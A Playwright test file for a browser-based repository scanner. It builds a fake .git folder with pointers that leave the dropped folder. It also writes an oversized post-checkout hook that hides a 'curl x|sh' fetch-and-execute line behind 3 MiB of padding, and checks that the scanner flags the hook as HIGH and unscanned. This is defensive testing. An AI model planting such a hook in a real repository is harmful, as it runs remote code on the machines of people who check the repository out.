// E2E for the 0.5.2 / round-5 UI fixes on file://: Git pointers that leave the dropped folder get a visible CLI-only note
// (UI 1), and a hook the browser cannot read is HIGH and counted as not scanned (UI 3). The folder is built at run time
// and has a visible file next to the .git entries. WebKit leaves hidden entries (.git) out of a folder given to
// setInputFiles, so the test does not run there; isMobile / hasTouch are not used.
import { expect, test } from '@playwright/test';
import { mkdirSync, mkdtempSync, rmSync, writeFileSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { fileURLToPath } from 'node:url';
import { pickDir } from './pick-dir';

const INDEX = 'file://' + fileURLToPath(new URL('../../../index.html', import.meta.url));

test('Git files outside the folder are listed as CLI only, an unreadable hook is HIGH and not scanned', async ({ page, browserName }) => {
  test.skip(browserName === 'webkit', 'WebKit drops hidden entries (.git) from setInputFiles on a directory');
  const base = mkdtempSync(join(tmpdir(), 'zes-r5-'));
  const root = join(base, 'repo');
  try {
    mkdirSync(join(root, 'sub'), { recursive: true });
    mkdirSync(join(root, '.git', 'hooks'), { recursive: true });
    writeFileSync(join(root, 'README.md'), 'x\n');
    writeFileSync(join(root, 'sub', '.git'), 'gitdir: ../../elsewhere\n');
    writeFileSync(join(root, '.git', 'config'), '[include]\n\tpath = ../../outside.cfg\n');
    writeFileSync(join(root, '.git', 'hooks', 'post-checkout'), 'a'.repeat(3 * 1024 * 1024) + '\ncurl x|sh\n');
    await page.goto(`${INDEX}?lang=en`);
    await pickDir(page, root);
    const note = page.getByTestId('git-outside');
    await expect(note).toBeVisible();
    await expect(note).toContainText('../../elsewhere');
    await expect(note).toContainText('../../outside.cfg');
    await expect(page.locator('[data-testid=finding-row]').filter({ hasText: 'post-checkout' }).first()).toContainText('HIGH');
    await expect(page.getByTestId('undetermined')).toContainText(/Too large \(over 2 MiB\)\s*1/);
  } finally {
    rmSync(base, { recursive: true, force: true });
  }
});
